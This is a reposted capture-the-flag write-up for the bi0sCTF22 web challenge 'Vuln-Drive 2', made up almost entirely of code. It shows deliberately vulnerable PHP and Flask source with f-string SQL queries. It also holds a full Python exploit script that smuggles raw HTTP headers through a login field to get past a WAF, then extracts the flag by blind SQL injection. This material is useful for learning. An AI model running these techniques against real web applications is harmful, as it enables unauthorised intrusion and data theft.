# Vuln-Drive 2 – bi0sCTF22

> 原文: https://www.ctfiot.com/94174.html
> ID: 94174


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
services:
 frontend:
 build: ./php
 ports:
 - 8000:80
 ...
 networks:
 - frontend

 waf:
 build: ./waf
 networks:
 - frontend
 - backend
 ...
 on-failure
 app:
 build: ./app
 environment:
 - FLAG=fakeflag
 networks:
 - backend
 ...
networks:
 frontend:
 backend:
1
2
3
4
5
6
7
8
9
10
if(isset($_GET['file'])){
 $file = $_GET['file'];
 $ext = explode('.', $file);
 $type = substr(strtolower(end($ext)),0,3);
 $file = $FOLDER."/".$file;
 if($type==="txt"){
 try {
 if(file_exists($file)){
 chdir($FOLDER);
 echo file_get_contents($_GET['file']);
1
2
3
4
5
6
7
8
if($fileSize < 100000){
 $name = uniqid('', true).".".$fileActualExt;
 $fileDestination = $FOLDER.$_POST['path'];
 upload($file['tmp_name'], $fileDestination,$name);
 header("Location: index.php?uploadsuccess");
 }else{
 $error = "Your file is too big!";
 }
1
if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag")
1
2
3
4
5
6
7
8
if(r.Header.Get("X-pro-hacker")!=""){
 fmt.Fprintf(w, "Hello Hacker!\n")
 return
}
if(strings.Contains(r.Header.Get("flag"), "gimme")){
 fmt.Fprintf(w, "No flag For you!\n")
 return
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
CREATE TABLE IF NOT EXISTS users (
 username TEXT,
 token TEXT
 );
CREATE TABLE IF NOT EXISTS flag (
 flag_is_here TEXT
 );
Delete from users;
Delete from flag;
INSERT INTO users values ('user','some_randomtoken'),
 ('admi','some_randomtoken'),
 (
 'admin',
 '{FLAG}'
 );
INSERT INTO flag values ('{FLAG}');
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
if request.headers.get("Token"):
 token = request.headers.get("Token")
 token = token[:16]
 token = token.replace(" ","").replace('"',"")
 if request.form.get("user"):
 user = request.form.get("user")
 user = user[:38]
 add_user(user,token)
 query = f'SELECT * FROM users WHERE token="{token}"'
 res = db_query(query)
 res = res.fetchone()
 return res[1] if res and len(res[0])>0 else "INDEX\n"
 
except Exception as e:
 print(e)
 return "INDEX\n"
1
2
3
4
def add_user(user,token):
 q = f"INSERT INTO users values ('{user}','{token}')"
 db_query(q)
 return
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
import requests
import re
import string

    #url = "http://localhost:
8000"
url = "http://web.chall.bi0s.in:
8000"

S = requests.Session()
S.get(url)
S.post(url+'/login.php',data = {"username": "asdf","submit":"submit"} )
S.get(url+'/index.php?new=http:')
S.post(url+"/index.php",files={"file":('asdf.txt@waf','abc.txt')}, data={"submit":"submit","path":"http:"})

files= S.get(url+"/view.php?fol=http:").text
file = re.findall("<a href='(.*?)'>",files)
file = f"http://{file[0].replace('/view.php?file=http:/','')}"
print(file)

payload = """hello
Host: localhost
X-pro_hacker: Pro-hacker
Token: {}
flag: hello
flag: gimme
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

user=a',substr((select*from flag),{},1));--"""
flag = ""

for i in range(1,10):
 for letter in "1234567890abcdef":
 print("Trying....", letter)
 p = payload.format(letter,str(i))
 data = {"username": p.replace("\n","\r\n"),"submit":"submit"}

 S.post(url+'/login.php',data = data )

 res = S.get(url+f"/view.php?fol=.&file={file}").text

 match = re.findall("not found(.)",res)[0]
 #print(res)
 if letter == match:
 flag += letter
 print(flag)
 break
```
